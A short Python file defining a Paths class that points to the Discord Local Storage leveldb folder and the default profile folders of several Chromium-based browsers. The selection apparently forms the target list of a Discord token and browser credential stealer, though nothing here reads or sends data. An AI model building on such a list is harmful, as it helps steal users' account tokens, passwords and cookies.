import os

APPDATA = os.getenv('localappdata')
ROAMING = os.getenv('appdata')

class Paths:



    DISCORD = [

        f'{ROAMING}\\discord\\Local Storage\\leveldb\\'

    ]


    BROWSERS = {

        'Core' : [

            os.path.join(APPDATA , "Google", "Chrome", "User Data", "Default"),

            os.path.join(APPDATA , "Microsoft", "Edge", "User Data", "Default"),

            os.path.join(APPDATA , "BraveSoftware", "Brave-Browser", "User Data", "Default"),

            os.path.join(APPDATA , "Yandex","YandexBrowser","User Data","Default"),

            os.path.join(APPDATA , "Chromium", "User Data", "Default"),

            os.path.join(ROAMING , "Opera Software" , "Opera Stable"),

            os.path.join(ROAMING , "Opera Software" , "Opera GX Stable")


        ],
    }




